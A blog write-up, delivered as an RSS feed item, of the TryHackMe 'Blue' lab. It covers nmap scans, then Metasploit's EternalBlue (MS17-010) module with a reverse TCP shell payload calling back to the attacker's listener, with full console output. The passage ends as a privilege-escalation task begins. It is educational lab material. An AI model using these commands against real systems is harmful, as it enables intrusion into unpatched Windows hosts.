<rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><channel><title>eternal blue - Tag - Pascal's Blog</title><link>https://blog.ppeinecke.de/tags/eternal-blue/</link><description>eternal blue - Tag - Pascal's Blog</description><generator>Hugo -- gohugo.io</generator><language>en</language><lastBuildDate>Sat, 09 Apr 2022 03:58:23 +0200</lastBuildDate><atom:link href="https://blog.ppeinecke.de/tags/eternal-blue/" rel="self" type="application/rss+xml"/><item><title>THM - Learn - Offensive Pentesting - Blue</title><link>https://blog.ppeinecke.de/posts/thm-learn-offensive-pentesting-blue/</link><pubDate>Sat, 09 Apr 2022 03:58:23 +0200</pubDate><guid>https://blog.ppeinecke.de/posts/thm-learn-offensive-pentesting-blue/</guid><description><![CDATA[<div class="featured-image">
                <img src="/featuredImages/blue-thumbnail.png" referrerpolicy="no-referrer">
            </div><h1 id="tryhackme---learn---offensive-pentesting---blue">TryHackMe - Learn - Offensive Pentesting - Blue</h1>
<hr>
<h2 id="task-1-recon">Task 1: Recon</h2>
<h3 id="scan-and-learn-what-exploit-this-machine-is-vulnerable-to-please-note-that-this-machine-does-not-respond-to-ping-icmp-and-may-take-a-few-minutes-to-boot-up-this-room-is-not-meant-to-be-a-boot2root-ctf-rather-this-is-an-educational-series-for-complete-beginners-professionals-will-likely-get-very-little-out-of-this-room-beyond-basic-practice-as-the-process-here-is-meant-to-be-beginner-focused">Scan and learn what exploit this machine is vulnerable to. Please note that this machine does not respond to ping (ICMP) and may take a few minutes to boot up. This room is not meant to be a boot2root CTF, rather, this is an educational series for complete beginners. Professionals will likely get very little out of this room beyond basic practice as the process here is meant to be beginner-focused.</h3>
<hr>
<ul>
<li>Scan the machine. (If you are unsure how to tackle this, I recommend checking out the Nmap room)</li>
</ul>
<pre><code class="language-bash">export IP=&quot;10.10.14.17&quot;
</code></pre>
<pre><code class="language-bash">mkdir nmap

sudo nmap -sC -sV -v -O $IP -o nmap/initial

# Nmap 7.92 scan initiated Sat Apr  9 02:01:41 2022 as: nmap -sC -sV -v -O -o nmap/initial 10.10.14.17
Nmap scan report for 10.10.14.17
Host is up (0.039s latency).
Not shown: 991 closed tcp ports (reset)
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  tcpwrapped
| ssl-cert: Subject: commonName=Jon-PC
| Issuer: commonName=Jon-PC
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2022-04-07T23:52:22
| Not valid after:  2022-10-07T23:52:22
| MD5:   9796 2e4d cd63 7fe6 b315 ab65 f94c 0baf
|_SHA-1: 4ff6 8427 ce68 f8d3 2e98 a71f f0e9 cd4c 9658 1e1a
|_ssl-date: 2022-04-09T00:03:10+00:00; +1s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: JON-PC
|   NetBIOS_Domain_Name: JON-PC
|   NetBIOS_Computer_Name: JON-PC
|   DNS_Domain_Name: Jon-PC
|   DNS_Computer_Name: Jon-PC
|   Product_Version: 6.1.7601
|_  System_Time: 2022-04-09T00:02:55+00:00
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49158/tcp open  msrpc        Microsoft Windows RPC
49159/tcp open  msrpc        Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=4/9%OT=135%CT=1%CU=41609%PV=Y%DS=2%DC=I%G=Y%TM=6250CD3
OS:D%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10B%TI=I%CI=I%II=I%SS=S%TS=
OS:7)SEQ(SP=106%GCD=1%ISR=10B%TI=I%CI=I%TS=7)OPS(O1=M505NW8ST11%O2=M505NW8S
OS:T11%O3=M505NW8NNT11%O4=M505NW8ST11%O5=M505NW8ST11%O6=M505ST11)WIN(W1=200
OS:0%W2=2000%W3=2000%W4=2000%W5=2000%W6=2000)ECN(R=Y%DF=Y%T=80%W=2000%O=M50
OS:5NW8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%
OS:W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=
OS:)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=
OS:S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF
OS:=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=
OS:G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)

Uptime guess: 0.009 days (since Sat Apr  9 01:50:42 2022)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=262 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1h00m01s, deviation: 2h14m10s, median: 0s
| smb2-time: 
|   date: 2022-04-09T00:02:55
|_  start_date: 2022-04-08T23:52:20
| smb2-security-mode: 
|   2.1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| nbstat: NetBIOS name: JON-PC, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 02:5e:37:02:b6:59 (unknown)
| Names:
|   JON-PC&lt;00&gt;           Flags: &lt;unique&gt;&lt;active&gt;
|   WORKGROUP&lt;00&gt;        Flags: &lt;group&gt;&lt;active&gt;
|   JON-PC&lt;20&gt;           Flags: &lt;unique&gt;&lt;active&gt;
|   WORKGROUP&lt;1e&gt;        Flags: &lt;group&gt;&lt;active&gt;
|   WORKGROUP&lt;1d&gt;        Flags: &lt;unique&gt;&lt;active&gt;
|_  \x01\x02__MSBROWSE__\x02&lt;01&gt;  Flags: &lt;group&gt;&lt;active&gt;
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Jon-PC
|   NetBIOS computer name: JON-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2022-04-08T19:02:55-05:00

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Apr  9 02:03:09 2022 -- 1 IP address (1 host up) scanned in 88.10 seconds
</code></pre>
<ul>
<li>How many ports are open with a port number under 1000?</li>
</ul>
<p>There are 3 ports open with a port number under 1000:</p>
<p><code>135, 139 and 445</code></p>
<ul>
<li>What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067)</li>
</ul>
<pre><code class="language-bash">sudo nmap -v --script=vuln -o nmap/vuln $IP

# Nmap 7.92 scan initiated Sat Apr  9 02:09:41 2022 as: nmap -v --script=vuln -o nmap/vuln 10.10.14.17
Pre-scan script results:
| broadcast-avahi-dos: 
|   Discovered hosts:
|     224.0.0.251
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Nmap scan report for 10.10.14.17
Host is up (0.034s latency).
Not shown: 991 closed tcp ports (reset)
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49158/tcp open  unknown
49159/tcp open  unknown

Host script results:
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
|_smb-vuln-ms10-054: false
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143

Read data files from: /usr/bin/../share/nmap
# Nmap done at Sat Apr  9 02:11:43 2022 -- 1 IP address (1 host up) scanned in 121.52 seconds
</code></pre>
<p>The machine seems to be vulnerable to <code>ms17-010 (CVE-2017-0143)</code>, also known as
<code>EternalBlue</code></p>
<hr>
<h2 id="task-2-gain-access">Task 2: Gain Access</h2>
<h3 id="exploit-the-machine-and-gain-a-foothold">Exploit the machine and gain a foothold.</h3>
<hr>
<ul>
<li>Start Metasploit</li>
</ul>
<pre><code class="language-bash">msfconsole
</code></pre>
<ul>
<li>Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/&hellip;&hellip;..)</li>
</ul>
<pre><code class="language-bash">msf6 &gt; search ms17-010 -t exploit

Matching Modules
================

   #  Name                                      Disclosure Date  Rank     Check  Description
   -  ----                                      ---------------  ----     -----  -----------
   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   3  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
</code></pre>
<p>We found an exploit for ms17-010.</p>
<p>The exploit <code>exploit/windows/smb/ms17_010_eternalblue</code> should do the trick.</p>
<ul>
<li>Show options and set the one required value. What is the name of this value? (All caps for submission)</li>
</ul>
<pre><code class="language-bash">msf6 &gt; use exploit/windows/smb/ms17_010_eternalblue
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp

msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wik
                                             i/Using-Metasploit
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects Wind
                                             ows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines
                                             .
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Windows
                                             Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server 200
                                             8 R2, Windows 7, Windows Embedded Standard 7 target machines.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.178.101  yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target
</code></pre>
<p>The required value we need to set is the IP address of our target machine (out victim).</p>
<p>In our case it is <code>10.10.14.17</code></p>
<pre><code class="language-bash">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; set RHOSTS 10.10.14.17
RHOSTS =&gt; 10.10.14.17
</code></pre>
<p>So the name of the require value is <code>RHOSTS</code></p>
<ul>
<li>Usually it would be fine to run this exploit as is; however, for the sake of learning, you should do one more thing before exploiting the target. Enter the following command and press enter:</li>
</ul>
<p>set payload windows/x64/shell/reverse_tcp</p>
<p>Ok let&rsquo;s use this reverse tcp payload to get a shell connection via reverse tcp
from the victim.</p>
<p>One important step that THM is not telling me is that I need to set my listener ip
address to the ip of my tun0 adapter since it will not work if I am listening
on my normal wifi adapter because I am connected to a VPN.</p>
<p>So let&rsquo;s fix that!</p>
<pre><code class="language-bash">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; set LHOST tun0
LHOST =&gt; tun0
</code></pre>
<p>With that set I will try to run the exploit now!</p>
<pre><code class="language-bash">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; run

[*] Started reverse TCP handler on 10.8.33.96:4444 
[*] 10.10.14.17:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.14.17:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.14.17:445       - Scanned 1 of 1 hosts (100% complete)
[+] 10.10.14.17:445 - The target is vulnerable.
[*] 10.10.14.17:445 - Connecting to target for exploitation.
[+] 10.10.14.17:445 - Connection established for exploitation.
[+] 10.10.14.17:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.14.17:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.14.17:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.14.17:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.14.17:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.10.14.17:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.14.17:445 - Trying exploit with 12 Groom Allocations.
[*] 10.10.14.17:445 - Sending all but last fragment of exploit packet
[*] 10.10.14.17:445 - Starting non-paged pool grooming
[+] 10.10.14.17:445 - Sending SMBv2 buffers
[+] 10.10.14.17:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.14.17:445 - Sending final SMBv2 buffers.
[*] 10.10.14.17:445 - Sending last fragment of exploit packet!
[*] 10.10.14.17:445 - Receiving response from exploit packet
[+] 10.10.14.17:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.14.17:445 - Sending egg to corrupted connection.
[*] 10.10.14.17:445 - Triggering free of corrupted buffer.
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Command shell session 2 opened (10.8.33.96:4444 -&gt; 10.10.14.17:49173 ) at 2022-04-09 02:35:37 +0200
[*] Command shell session 4 opened (10.8.33.96:4444 -&gt; 10.10.14.17:49175 ) at 2022-04-09 02:35:37 +0200
[*] Command shell session 1 opened (10.8.33.96:4444 -&gt; 10.10.14.17:49172 ) at 2022-04-09 02:35:37 +0200
[*] Command shell session 3 opened (10.8.33.96:4444 -&gt; 10.10.14.17:49174 ) at 2022-04-09 02:35:37 +0200
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Command shell session 5 opened (10.8.33.96:4444 -&gt; 10.10.14.17:49176 ) at 2022-04-09 02:35:37 +0200
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[*] Sending stage (336 bytes) to 10.10.14.17
[+] 10.10.14.17:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.14.17:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.14.17:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=


Shell Banner:
Microsoft Windows [Version 6.1.7601]
-----
          

C:\Windows\system32&gt;
</code></pre>
<p>I successfully exploited Eternal Blue and got a reverse shell from the victim.</p>
<ul>
<li>Confirm that the exploit has run correctly. You may have to press enter for the DOS shell to appear. Background this shell (CTRL + Z). If this failed, you may have to reboot the target VM. Try running it again before a reboot of the target.</li>
</ul>
<p>I backgrounded the shell session using <code>CTRL + Z</code></p>
<hr>
<h2 id="task-3-escalate">Task 3: Escalate</h2>
<h3 id="escalate-privileges-learn-how-to-upgrade-shells-in-metasploit">Escalate privileges, learn how to upgrade shells in metasploit.</h3>
<hr>
<ul>
<li>If you haven&rsquo;t already, background the previously gained shell (CTRL + Z). Research online how to convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use? (Exact path, similar to the exploit we previously selected)</li>
</ul>
